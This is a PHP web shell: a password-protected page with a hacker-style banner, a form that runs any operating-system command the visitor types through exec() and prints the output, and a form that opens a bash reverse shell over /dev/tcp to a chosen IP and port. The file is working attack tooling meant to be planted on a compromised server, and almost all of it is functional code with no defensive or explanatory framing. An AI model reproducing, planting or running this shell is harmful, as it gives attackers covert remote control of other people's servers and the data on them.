<?php
$banner =  "
                                                                                                                                               _____   
______  ______  _____                _____                _____   ______   _______ ___________             ____                 _____     _____\    \  
\     \|\     \|\    \             /      |_         _____\    \_|\     \  \      \\          \        ____\_  \__         _____\    \   /    / |    | 
 |     |\|     |\\    \           /         \       /     /|     |\\     \  |     /|\    /\    \      /     /     \       /    / \    | /    /  /___/| 
 |     |/____ /  \\    \         |     /\    \     /     / /____/| \|     |/     //  |   \_\    |    /     /\      |     |    |  /___/||    |__ |___|/ 
 |     |\     \   \|    | ______ |    |  |    \   |     | |____|/   |     |_____//   |      ___/    |     |  |     |  ____\    \ |   |||       \       
 |     | |     |   |    |/      \|     \/      \  |     |  _____    |     |\     \   |      \  ____ |     |  |     | /    /\    \|___|/|     __/ __    
 |     | |     |   /            ||\      /\     \ |\     \|\    \  /     /|\|     | /     /\ \/    \|     | /     /||    |/ \    \     |\    \  /  \   
/_____/|/_____/|  /_____/\_____/|| \_____\ \_____\| \_____\|    | /_____/ |/_____/|/_____/ |\______||\     \_____/ ||\____\ /____/|    | \____\/    |  
|    |||     | | |      | |    ||| |     | |     || |     /____/||     | / |    | ||     | | |     || \_____\   | / | |   ||    | |    | |    |____/|  
|____|/|_____|/  |______|/|____|/ \|_____|\|_____| \|_____|    |||_____|/  |____|/ |_____|/ \|_____| \ |    |___|/   \|___||____|/      \|____|   | |  
                                                          |____|/                                     \|____|                                 |___|/   
";
?>
<html>
    <header>
        <style>
            body {
            color: red;
            background-color: rgb(0, 26, 26);
            }
            .shell {
                color: white;
                display: inline;
            }
            form{
                padding: 10px;
                border-style: solid;
                border-width: 2px;
                border-color: red
            }
        </style>
    </header>
    <body>
        <?php
            echo "<div> ";
            echo "<pre>";
            echo $banner;
            echo "</pre>";
            echo "</div>"; 


        ?>
        <?php       
            // defult password : yourpassword
            if (hash(sha256,$_POST["pass"]) === "e3c652f0ba0b4801205814f8b6bc49672c4c74e25b497770bb89b22cdeb4e951"
                         or $_COOKIE['token'] === hash("sha512","e3c652f0ba0b4801205814f8b6bc49672c4c74e25b497770bb89b22cdeb4e951")){
                    $cookie_name = "token";
                    $cookie_value = hash(   "sha512","e3c652f0ba0b4801205814f8b6bc49672c4c74e25b497770bb89b22cdeb4e951");
                    setcookie($cookie_name, $cookie_value, time() + (864 * 30), "/");
            }else{
                    echo '
                    <form name="form" action="" method="post">
                        Password : <input type="password" name="pass" id="pass" palceholder="password">
                    </form>
                    ';
                    die("Please enter your fucking password");
                }
            
        ?>
        <form name="form" action="" method="post">
            Command : <input type="text" name="command" id="command" value="">
        </form>
        <form name="form" action="" method="post">
            <p>Get revese shell</p>
            Ip : <input type="text" name="ip" id="ip" value=""> Port : <input type="text" name="port" id="port" value=""> 
            <input type="submit" value="Run">
        </form>
        <?php 
            
            if (isset($_POST['command'])){
                $input = $_POST['command'];
                shell($input);
            }elseif(isset($_POST['ip']) and isset($_POST['port'])){
                rev_shell($_POST['ip'],$_POST['port']);
            }
            
        ?>
        <div >
            <?php
                function shell($input){
                    $row = exec($input,$output,$error);
                    while(list(,$row) = each($output)){
                    echo "<p class='shell'>", $row, "</p>", "<br>";
                    }
                    if($error){
                        echo "Error : $error<br>";
                    exit;
                    }
                }
                function rev_shell($ip,$port){
                    exec("/bin/bash -c 'bash -i >& /dev/tcp/".$ip."/".$port." 0>&1'");
                }
            ?>
        </div>

    </body>
</dl>


</html>
